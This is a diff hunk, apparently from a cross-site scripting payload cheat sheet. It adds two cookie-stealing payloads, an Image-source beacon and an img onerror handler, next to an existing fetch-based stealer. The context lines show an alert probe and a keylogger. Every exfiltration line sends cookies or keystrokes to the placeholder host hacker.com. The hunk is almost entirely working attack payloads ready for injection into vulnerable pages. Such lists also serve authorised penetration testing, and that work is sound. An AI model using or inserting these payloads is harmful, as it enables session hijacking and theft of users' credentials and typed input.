@@ -4,7 +4,9 @@
 `<script>alert(document.domain);</script>`
 
 #### Cookie stealer  
-`<script>fetch('https://hacker.com/steal?cookie=' + btoa(document.cookie));</script>`
+`<script>fetch('https://hacker.com/steal?cookie=' + btoa(document.cookie));</script>`  
+`<script>var i=new Image;i.src="http://hacker.com/?"+document.cookie;</script>`  
+`<img src=x onerror="this.src='http://hacker.com/?'+document.cookie; this.removeAttribute('onerror');">`
 
 #### Key logger  
 `<script>document.onkeypress = function(e) { fetch('https://hacker.com/log?key=' + btoa(e.key) );}</script>`
